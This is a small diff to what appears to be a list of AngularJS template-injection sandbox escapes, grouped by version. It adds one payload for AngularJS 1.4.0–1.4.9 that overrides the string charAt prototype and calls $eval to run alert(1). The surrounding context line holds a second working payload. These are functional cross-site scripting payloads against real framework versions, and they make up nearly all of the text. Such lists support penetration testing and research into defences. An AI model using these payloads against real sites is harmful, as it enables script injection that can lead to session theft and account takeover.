@@ -61,6 +61,7 @@ AngularJS 1.4.0 - 1.4.9
 
 ```javascript
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}
 ```
 
 AngularJS 1.3.20
